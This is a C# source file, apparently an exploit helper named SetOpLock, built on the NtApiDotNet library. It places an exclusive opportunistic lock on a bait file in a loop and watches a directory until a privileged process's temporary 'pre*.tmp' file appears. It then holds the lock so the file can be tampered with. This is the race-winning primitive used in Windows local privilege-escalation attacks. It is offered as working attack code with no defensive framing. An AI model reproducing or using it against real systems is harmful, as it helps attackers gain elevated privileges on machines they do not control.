using System;
using System.Runtime.InteropServices;
using NtApiDotNet;

using FILETIME = System.Runtime.InteropServices.ComTypes.FILETIME;

namespace SetOpLock
{
    internal class Program
    {
        static void Main(string[] args)
        {
            IntPtr INVALID_HANDLE_VALUE = new IntPtr(-1);
            WIN32_FIND_DATA findFileData = new WIN32_FIND_DATA();
            WIN32_FIND_DATA findFileData2 = new WIN32_FIND_DATA();

            NtFile ntFile = NtFile.Open(@"\??\C:\Workspace\Bait\target.txt", null, FileAccessRights.ReadAttributes, FileShareMode.All, FileOpenOptions.None);
            while (true)
            {
                var OpLockTask = ntFile.OplockExclusiveAsync();
                Console.WriteLine("[*] OpLock set on file");
                var hFind = FindFirstFile(@"C:\Workspace\Bait\pre*.tmp", out findFileData);
                if (hFind != INVALID_HANDLE_VALUE)
                {
                    var hFind2 = FindFirstFile(@"C:\Workspace\Bait\pre*.tmp", out findFileData2);
                    if (hFind2 != INVALID_HANDLE_VALUE)
                    {
                        if (findFileData.cFileName == findFileData2.cFileName)
                        {
                            Console.WriteLine("[+] Get the name of the temporary file: " + findFileData.cFileName);
                            Console.WriteLine("Please press Enter to release...");
                            Console.ReadLine();
                            return;
                        }
                    }
                }
                Console.WriteLine("[*] Releasing OpLock");
                ntFile.AcknowledgeOplock(OplockAcknowledgeLevel.No2);
            }
        }

        [DllImport("KERNELBASE.DLL", CharSet = CharSet.Unicode, SetLastError = true)]
        internal static extern IntPtr FindFirstFile(string lpFileName, out WIN32_FIND_DATA lpFindFileData);

        [StructLayout(LayoutKind.Sequential, CharSet = CharSet.Unicode)]
        internal struct WIN32_FIND_DATA
        {
            public uint dwFileAttributes;
            public FILETIME ftCreationTime;
            public FILETIME ftLastAccessTime;
            public FILETIME ftLastWriteTime;
            public uint nFileSizeHigh;
            public uint nFileSizeLow;
            public uint dwReserved0;
            public uint dwReserved1;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 260)]
            public string cFileName;
            [MarshalAs(UnmanagedType.ByValTStr, SizeConst = 14)]
            public string cAlternateFileName;
        }
    }
}
